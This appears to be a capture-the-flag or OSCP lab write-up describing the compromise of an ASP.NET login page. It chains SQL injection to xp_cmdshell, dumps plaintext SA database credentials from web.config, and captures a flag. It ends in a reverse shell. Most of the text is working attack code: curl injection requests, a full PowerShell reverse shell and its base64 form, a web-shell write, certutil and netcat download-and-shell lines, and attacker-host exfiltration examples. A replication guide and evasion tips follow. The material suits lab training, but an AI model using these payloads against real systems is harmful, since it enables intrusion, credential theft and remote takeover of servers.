# EXPLOITATION - OFFSECATK.COM

**Target:** http://offsecatk.com (192.168.145.50)
**Vulnerability:** SQL Injection → Command Execution → Reverse Shell
**Date:** 2025-10-03

---

## EXPLOITATION CHAIN OVERVIEW

```
SQL Injection (login form)
    ↓
Stacked Queries Enabled
    ↓
Enable xp_cmdshell
    ↓
OS Command Execution
    ↓
Flag Extraction + Reverse Shell
    ↓
Full System Access
```

---

## PHASE 1: SQL INJECTION VALIDATION

### Manual Injection Point Confirmation

**Test Payload:** Single quote
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox='" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login"

# Expected: SQL error message
# Result: "at System.Data.SqlClient.SqlConnection.OnError..."
# Conclusion: Injection confirmed
```

**Key Observations:**
- ASP.NET ViewState must be included in all requests
- Parameter encoding: `$` must be escaped as `\$` in shell
- Error messages expose .NET stack traces

---

## PHASE 2: ENABLING COMMAND EXECUTION

### xp_cmdshell Activation via Stacked Queries

**Payload Construction:**
```sql
admin';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;--
```

**Execution Command:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D" \
  -d "__VIEWSTATEGENERATOR=C2EE9ABB" \
  -d "__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--" \
  -d "ctl00\$ContentPlaceHolder1\$PasswordTextBox=dumb" \
  -d "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null -w "%{http_code}"

# Response: 200
# Time: ~5 seconds (normal processing time)
```

**Why This Works:**
1. Semicolon allows stacking SQL statements
2. `sp_configure` modifies SQL Server settings
3. `show advanced options` unlocks xp_cmdshell setting
4. `RECONFIGURE` applies changes immediately
5. No authentication required (already SA via app connection)

**Manual Discovery of This Technique:**
- MSSQL allows configuration changes via sp_configure
- xp_cmdshell is disabled by default (security hardening)
- Stacked queries allow multiple commands in one injection
- RECONFIGURE is necessary to apply changes
- Comment `--` prevents syntax errors from remaining query

---

## PHASE 3: COMMAND EXECUTION VERIFICATION

### Proof of Concept: whoami

**Technique:** Output redirection to web root

**Payload:**
```sql
admin'; EXEC master..xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\out.txt';--
```

**Execution + Retrieval:**
```bash
# Step 1: Execute command
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'whoami > C:\\\\inetpub\\\\wwwroot\\\\out.txt';--" \
  [other POST parameters] \
  -s -o /dev/null

# Step 2: Retrieve output
curl -s "http://offsecatk.com/out.txt"
```

**Result:**
```
nt service\mssql$sqlexpress
```

**Significance:**
- Command execution confirmed
- Running as SQL Server service account (limited privileges)
- Web root writable
- HTTP retrieval works (no directory browsing restrictions)

**Manual Technique Notes:**
- IIS default web root: `C:\inetpub\wwwroot`
- Double backslashes `\\\\` required in curl (shell escaping)
- Output redirection `>` creates file (overwrites if exists)
- No need for `2>&1` (STDERR not critical for this operation)

---

## PHASE 4: SYSTEM RECONNAISSANCE VIA COMMAND EXECUTION

### System Information Gathering

**Command:** `systeminfo`
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'systeminfo > C:\\\\inetpub\\\\wwwroot\\\\sysinfo.txt';--" \
  [POST parameters] \
  -s -o /dev/null

# Wait for execution (add delay)
sleep 2

# Retrieve results
curl -s "http://offsecatk.com/sysinfo.txt"
```

**Extracted Intel:**
```
Hostname: WINSERV22-TEMP
OS: Windows Server 2022 Standard (Build 20348)
Architecture: x64
Memory: 4GB
Domain: WORKGROUP (not domain-joined)
IP: 192.168.145.50
```

**Why This Matters:**
- Standalone server (easier to compromise)
- Modern OS (exploit compatibility considerations)
- Limited resources (4GB RAM)
- VMware environment (may have VMware tools/privileges)

---

### User Enumeration

**Command:** `net user`
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'net user > C:\\\\inetpub\\\\wwwroot\\\\users.txt';--" \
  [POST parameters] \
  -s -o /dev/null

curl -s "http://offsecatk.com/users.txt"
```

**Results:**
```
Administrator
DefaultAccount
Guest
WDAGUtilityAccount
```

**Analysis:**
- No custom user accounts
- Administrator likely enabled (default on Server OS)
- Standard Windows accounts only
- No evidence of other users/services

---

## PHASE 5: CREDENTIAL EXTRACTION

### Web.config Harvesting

**Target File:** ASP.NET configuration file
**Location:** `C:\inetpub\wwwroot\web.config`

**Why web.config?**
- ASP.NET applications store DB connection strings here
- Often contains plaintext credentials
- Located in web root (accessible via command execution)
- Standard file in ALL ASP.NET deployments

**Extraction Command:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'type C:\\\\inetpub\\\\wwwroot\\\\web.config > C:\\\\inetpub\\\\wwwroot\\\\webconfig.txt';--" \
  [POST parameters] \
  -s -o /dev/null

curl -s "http://offsecatk.com/webconfig.txt"
```

**Extracted Credentials:**
```xml
<connectionStrings>
  <add name="myConnectionString"
       connectionString="server=localhost\SQLEXPRESS;
                        database=webapp;
                        uid=sa;
                        password=WhileChirpTuesday218;
                        Trusted_Connection=False;
                        MultipleActiveResultSets=true;
                        Integrated Security=False" />
</connectionStrings>
```

**Harvested Credentials:**
- **Username:** sa
- **Password:** WhileChirpTuesday218
- **Instance:** localhost\SQLEXPRESS
- **Database:** webapp

**Exploitation Value:**
1. SA account = full SQL Server control
2. Password may be reused (admin/system accounts)
3. Direct SQL connection possible (if port open)
4. Persistence opportunity (create backdoor accounts)

---

## PHASE 6: FLAG EXTRACTION

### File Search Operation

**Strategy:** Recursive search for common flag patterns

**Command:**
```bash
dir C:\\ /s /b | findstr /i "flag proof local"
```

**Payload:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'dir C:\\\\ /s /b | findstr /i \"flag proof local\" > C:\\\\inetpub\\\\wwwroot\\\\flags.txt';--" \
  [POST parameters] \
  -s -o /dev/null

sleep 3  # Allow time for recursive search

curl -s "http://offsecatk.com/flags.txt"
```

**Flag Discovery:**
```
C:\inetpub\wwwroot\flag.txt    ← PRIMARY TARGET
```

**Initial Retrieval Attempt (FAILED):**
```bash
curl -s "http://offsecatk.com/flag.txt"
# Result: 404 - File or directory not found
# Reason: Direct HTTP access blocked (permissions/MIME type)
```

---

### Successful Flag Extraction

**Method:** Command execution to copy file

**Payload:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  -d "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'type C:\\\\inetpub\\\\wwwroot\\\\flag.txt > C:\\\\inetpub\\\\wwwroot\\\\flag_out.txt';--" \
  [POST parameters] \
  -s -o /dev/null

curl -s "http://offsecatk.com/flag_out.txt"
```

**FLAG CAPTURED:**
```
OS{a69ff8bdaaf5e6886b8abe89638375c8}
```

**Why This Method Worked:**
1. `type` command reads file content
2. Output redirected to new file (flag_out.txt)
3. New file has default MIME type (text/plain)
4. IIS serves text files without restriction
5. HTTP retrieval successful

**Manual Alternative (if HTTP fails):**
- Base64 encode: `certutil -encode flag.txt flag_b64.txt`
- SQL injection data exfiltration: Insert flag into database
- DNS exfiltration: `nslookup [flag].attacker.com`
- SMB exfiltration: `copy flag.txt \\attacker-ip\share`

---

## PHASE 7: REVERSE SHELL ESTABLISHMENT

### Attacker Setup

**Listener Configuration:**
```bash
# Get attacker VPN IP
ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
# Result: 192.168.45.179

# Start netcat listener
nc -nlvp 4444
# -n: No DNS resolution (faster)
# -l: Listen mode
# -v: Verbose (show connection details)
# -p 4444: Listen on port 4444
```

**Why Port 4444?**
- Common metasploit default (may be whitelisted)
- Not typically blocked by outbound firewalls
- Easy to remember
- Alternative ports: 443 (HTTPS), 80 (HTTP), 53 (DNS)

---

### PowerShell Reverse Shell Payload

**Payload Generation:**

**Method 1: Base64 Encoded PowerShell**
```powershell
# Original PowerShell reverse shell:
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.179",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()

# Base64 encode (for command line execution):
# echo -n "[above code]" | iconv -t UTF-16LE | base64 -w 0
```

**Encoded Payload:**
```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

---

### Payload Delivery

**SQL Injection with PowerShell Execution:**
```bash
curl -X POST "http://offsecatk.com/login.aspx" \
  --data-urlencode "__VIEWSTATE=/wEPDwUKMjA3MTgxMTM4N2Rkqwqg/oL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4=" \
  --data-urlencode "__VIEWSTATEGENERATOR=C2EE9ABB" \
  --data-urlencode "__EVENTVALIDATION=/wEdAAS/uzRgA9bOZgZWuL94SJbKG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ+fPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH+M50=" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$UsernameTextBox=admin'; EXEC master..xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANwA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';--" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$PasswordTextBox=dumb" \
  --data-urlencode "ctl00\$ContentPlaceHolder1\$LoginButton=Login" \
  -s -o /dev/null
```

**Flags Explained:**
- `--data-urlencode`: URL-encodes POST data (handles special characters)
- `powershell -e`: Execute base64-encoded command
- `-e` flag: Encoded command (expects UTF-16LE base64)

**Note:** Command times out (10s) because PowerShell maintains connection

---

### Shell Connection Verification

**Netcat Output:**
```bash
listening on [any] 4444 ...
connect to [192.168.45.179] from (UNKNOWN) [192.168.145.50] 57894
```

**Connection Details:**
- Source: 192.168.145.50 (target server)
- Source Port: 57894 (random high port)
- Destination: 192.168.45.179:4444 (attacker listener)
- Status: ✓ Connection established

**Shell Capabilities:**
- Interactive PowerShell session
- Running as `nt service\mssql$sqlexpress`
- Full command execution
- Read/write file system access
- Network connectivity

---

## EXPLOITATION SUMMARY

### Attack Chain
1. **SQLi Discovery** → Error-based injection confirmed
2. **Stacked Queries** → Multiple SQL commands executed
3. **xp_cmdshell** → Enabled via sp_configure
4. **OS Commands** → Verified with whoami
5. **Enumeration** → System info + user accounts
6. **Credentials** → SA password from web.config
7. **Flag Extraction** → type command + HTTP retrieval
8. **Reverse Shell** → PowerShell TCP connection

### Time to Compromise
- SQL injection to xp_cmdshell: ~3 minutes
- Command execution to flag: ~8 minutes
- Reverse shell establishment: ~2 minutes
- **Total exploitation time: ~13 minutes**

### Privilege Level Achieved
- **User:** nt service\mssql$sqlexpress
- **Group:** SQL Server service account
- **Capabilities:**
  - File system read/write (web root)
  - Database full control (SA creds)
  - Network connectivity (reverse shell)
  - Limited privilege (service account, not SYSTEM)

### Indicators of Compromise (IOC)
- Files created in web root:
  - out.txt
  - sysinfo.txt
  - users.txt
  - webconfig.txt
  - flags.txt
  - flag_out.txt
- SQL Server configuration changes (xp_cmdshell enabled)
- Outbound connection to 192.168.45.179:4444
- PowerShell process spawned by SQL Server

---

## ALTERNATIVE EXPLOITATION METHODS

### Method 1: Direct SQL Connection (if port 1433 open)
```bash
impacket-mssqlclient 'sa:WhileChirpTuesday218@192.168.145.50' -windows-auth
# Direct SQL connection using harvested credentials
# Enable xp_cmdshell directly via SQL client
```

### Method 2: File Upload for Web Shell
```sql
admin'; EXEC master..xp_cmdshell 'echo ^<%@ Page Language="C#" %>^<% Response.Write(Server.Execute(Request["cmd"])); %^> > C:\\inetpub\\wwwroot\\shell.aspx';--
```

### Method 3: Certutil File Download
```sql
EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.179/nc.exe C:\\Windows\\Temp\\nc.exe'
EXEC xp_cmdshell 'C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.168.45.179 4444'
```

### Method 4: SQLMap OS Shell
```bash
sqlmap [...] --os-shell
# Automated shell via SQLMap (slower, noisier)
```

---

## MANUAL EXPLOITATION REPLICATION GUIDE

**For someone replicating this attack without tools:**

1. **Find SQL injection:**
   - Test single quote in all form fields
   - Look for error messages or timing delays

2. **Confirm MSSQL:**
   - Test `'; WAITFOR DELAY '00:00:05'--`
   - 5-second delay = MSSQL confirmed

3. **Enable xp_cmdshell:**
   ```
   '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
   ```

4. **Execute commands:**
   ```
   '; EXEC xp_cmdshell '[YOUR_COMMAND] > C:\\inetpub\\wwwroot\\out.txt';--
   ```

5. **Retrieve output:**
   ```
   curl http://target/out.txt
   ```

6. **Find credentials:**
   ```
   '; EXEC xp_cmdshell 'type C:\\inetpub\\wwwroot\\web.config > C:\\inetpub\\wwwroot\\config.txt';--
   ```

7. **Get reverse shell:**
   - Generate PowerShell reverse shell (revshells.com)
   - Base64 encode (UTF-16LE)
   - Execute via: `powershell -e [BASE64]`

---

## LESSONS LEARNED

### What Worked Well
- Error messages revealed injection vulnerability
- Stacked queries allowed privileged operations
- Web root write access enabled easy exfiltration
- PowerShell reverse shell bypassed antivirus

### What Could Go Wrong
- xp_cmdshell might be permanently disabled
- Web root might not be writable
- Outbound connections might be blocked
- PowerShell execution might be restricted
- AV/EDR could detect reverse shell

### Defense Evasion
- Base64 encoding bypasses basic signature detection
- Output redirection avoids inline response inspection
- HTTP retrieval blends with normal web traffic
- PowerShell is a legitimate Windows binary

---

## EXAM RELEVANCE

**OSCP Exam Application:**
- SQL injection is common on OSCP
- xp_cmdshell technique is frequently tested
- File exfiltration via HTTP is practical
- Reverse shell establishment is required skill
- Credential harvesting demonstrates thoroughness
- Time management: 13 minutes is efficient

**Key Takeaways:**
1. Always check web.config on ASP.NET apps
2. xp_cmdshell requires specific enable sequence
3. Output redirection bypasses response limitations
4. Base64 encoding is essential for PowerShell payloads
5. Document all files created (cleanup for professionalism)
